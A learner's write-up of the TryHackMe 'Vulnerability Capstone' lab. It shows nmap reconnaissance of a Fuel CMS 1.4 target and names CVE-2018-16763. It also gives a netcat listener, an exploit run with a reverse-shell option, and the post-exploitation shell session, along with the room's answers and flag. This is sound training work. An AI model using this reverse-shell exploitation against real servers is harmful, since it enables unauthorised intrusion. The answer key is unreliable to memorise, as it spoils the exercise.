<h3> Welcome to the <em>TryHackMe ...</em></h3>
<h1>Jr Penetration Tester learning path > Vulnerability Research ></h1>
<h2>Vulnerability Capstone</h2>
<p>pply the knowledge gained throughout the Vulnerability Module in this challenge room.</p>
<br>
<p>October 28, 2024<br></p>
<br>


<div style="display: flex; justify-content: center; align-items: center;">
    <img src="https://github.com/user-attachments/assets/2ed7780f-5c58-47b4-86b4-90ecf77f7868" width="150px" height="150px"/>
</div>
<br>

![image](https://github.com/user-attachments/assets/160d4879-04d3-4b02-825e-a8d9e44fd7d4)

<p>Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s key part of my 30-day-streak in <a href="https://www.wicys.org/benefits/security-training-scholarship/">WiCyS SANS Security Training</a> Stage 2 Program.<br><br>
Let´s get started!!<br><br>
Access this TryHackMe Room clicking <a href="https://tryhackme.com/r/room/vulnerabilitycapstone">Vulnerability Capstone</a>.<br>
<code>Note</code>: only subscribers can deploy Virtual Machines in this room.</p>

<h2>Task 1 - Introduction</h2>
<br>

![image](https://github.com/user-attachments/assets/9e825e1c-083d-48a6-a2ed-f82fc8c22784)

<p>Summarise the skills learnt in this module by completing this capstone room for the "Vulnerability Research" module.<br> 

Ackme Support Incorporated has recently set up a new blog. Their developer team have asked for a security audit to be performed before they create and publish articles to the public.<br>

It is your task to perform a security audit on the blog; looking for and abusing any vulnerabilities that you find.</p>

> 1.1 - <em>Let's get hacking.</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>

<h2>Task 2 - Exploit the Machine (Flag Submission)</h2>

<p>Deploy the vulnerable machine attached to this by pressing the green "Start Machine" button. It is <code>recommended</code> that you use the TryHackMe AttackBox to complete this room.<br>

Allow <code>five minutes</code> to pass before attempting to attack the vulnerable machine <code>MACHINE_IP</code>.</p>
<br>

> 2.1 - <em>Deploy the vulnerable machine attached to this task & wait <code>five minutes</code> before visiting the vulnerable machine.</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>

<pre><code>$ nmap [Target_IP]

Starting Nmap 7.60 ( https://nmap.org ) at 2024-10-28 17:41 GMT
Nmap scan report for ip-[Target_IP].eu-west-1.compute.internal ([Target_IP])
Host is up (0.00037s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:27:5B:DF:10:2F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.68 seconds
</code></pre>
<br>

<pre><code>$ nmap -sV [Target_IP]

Starting Nmap 7.60 ( https://nmap.org ) at 2024-10-28 17:44 GMT
Nmap scan report for ip-[Target_IP].eu-west-1.compute.internal ([Target_IP])
Host is up (0.0041s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 02:27:5B:DF:10:2F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.87 seconds
</code></pre>
<br>

> 2.2 - <em>What is the name of the application running on the vulnerable machine?</em><br>
>> <code><strong>Fuel CMS</strong></code><br>
<p><br></p>

> 2.3 - <em>What is the version number of this application?</em><br>
>> <code><strong>1.4</strong></code><br>
<p><br></p>

![image](https://github.com/user-attachments/assets/436cc191-ab95-4f30-9520-10c2d019b1d2)

<br>

> 2.4 - <em>What is the number of the CVE that allows an attacker to remotely execute code on this application?</em><br>
> <code>Format</code>: CVE-XXXX-XXXXX
>> <code><strong>CVE-2018-16763</strong></code><br>
<p><br></p>

> 2.5 - <em>What is the value of the flag located on this vulnerable machine? This is located in <code>/home/ubuntu</code> on the vulnerable machine.</em>
>> <code><strong>THM{ACKME_BLOG_HACKED}</strong></code><br>
<p><br></p>

![image](https://github.com/user-attachments/assets/17fc5d2e-4c29-4755-85f1-63e700cefb3f)

<br>

![image](https://github.com/user-attachments/assets/113a9ee3-f4d4-42d9-8a36-000a88ca564e)

<br>

![image](https://github.com/user-attachments/assets/3b90d495-b60d-49d3-9e4d-916e04963e66)

<br>

![image](https://github.com/user-attachments/assets/16563e2d-546a-47ac-8ac2-937f08f6f6bb)

<br>

![image](https://github.com/user-attachments/assets/2d87ae8c-ba80-4e9a-ada0-bdf5ad637ea7)

<br>

![image](https://github.com/user-attachments/assets/aa1d57bc-7805-49e3-8226-5047dd515667)

<br>
<p>I did not continue using the file I downloaded from Exploit DB because it was presenting an error.</p>
<p>Proceeded copying the following:  <a href="https://gist.github.com/anir0y/8529960c18e212948b0e40ed1fb18d6d#file-fuel-cms-py">Vulnerability Capstone</a><br><br>
I set a listener.</p><br>

<pre><code>$ root@[Attack_IP]:~# nc -lvnp [Port]
</code></pre>
<br>

<p>Then I run the exploit with <code>python</code> against the <code>Target Machine</code>.</p>

<pre><code>$ python3 fuel-cms.py [Target_IP]
 ______         _ _____ ___  ___ _____ 
|  ___|        | /  __ \|  \/  |/  ___|
| |_ _   _  ___| | /  \/| .  . |\ `--. 
|  _| | | |/ _ \ | |    | |\/| | `--. \
| | | |_| |  __/ | \__/\| |  | |/\__/ /
\_|  \__,_|\___|_|\____/\_|  |_/\____/ 

Tested on 1.4                                       

Created by Ac1d

	Menu

exit     -	Exit app
shell_me -	Get a reverse shell (netcat) 
help     -	Show this help

fuelCMS$ shell_me
Enter your attacking machine IP:PORT $ [Attack_IP]:[Port]
   
</code></pre>
<br>

<p>After typing option <code>shell_me</code>, I got access to the <code>Target Machine</code>.</p>

<br>

<p>And I got access to the <code> Target Machine</code>.</p>

<pre><code>$ root@[Attack_IP]:~# nc -lvnp [Port]

Listening on [0.0.0.0] (family 0, port [Port])
Connection from [Target_IP] [Target_Port] received!
/bin/sh: 0: can't access tty; job control turned off
$ pwd
/var/www/html/fuelcms
$ whoami
www-data
$ cd /home/ubuntu
$ ls -la
total 40
drwxr-xr-x 5 ubuntu ubuntu 4096 Sep  3  2021 .
drwxr-xr-x 3 root   root   4096 Sep  3  2021 ..
-rw------- 1 ubuntu ubuntu  178 Sep  3  2021 .Xauthority
lrwxrwxrwx 1 ubuntu ubuntu    9 Sep  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 ubuntu ubuntu  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3771 Feb 25  2020 .bashrc
drwx------ 2 ubuntu ubuntu 4096 Sep  3  2021 .cache
drwxrwxr-x 3 ubuntu ubuntu 4096 Sep  3  2021 .local
-rw-r--r-- 1 ubuntu ubuntu  807 Feb 25  2020 .profile
drwx------ 2 ubuntu ubuntu 4096 Sep  3  2021 .ssh
-rw-r--r-- 1 ubuntu ubuntu    0 Sep  3  2021 .sudo_as_admin_successful
-rw-rw-r-- 1 ubuntu ubuntu   23 Sep  3  2021 flag.txt
$ cat flag.txt
THM{ACKME_BLOG_HACKED}
</code></pre>
<br>

<h2>Room Complete</h2>
<p>Keep learning, keep growing!<br>

![image](https://github.com/user-attachments/assets/80a2a3bc-f069-46cc-ace2-006c45bbd4a9)

<h2>My journey</h2>
<p></p>Following I share the status of my journey in TryHackMe.</p>

![image](https://github.com/user-attachments/assets/d1097bf7-819c-4529-a163-5c119e8bd770)

<p></p>

<p style="text-align: center;">Thank you for coming. Hope to learn together again!!</p>
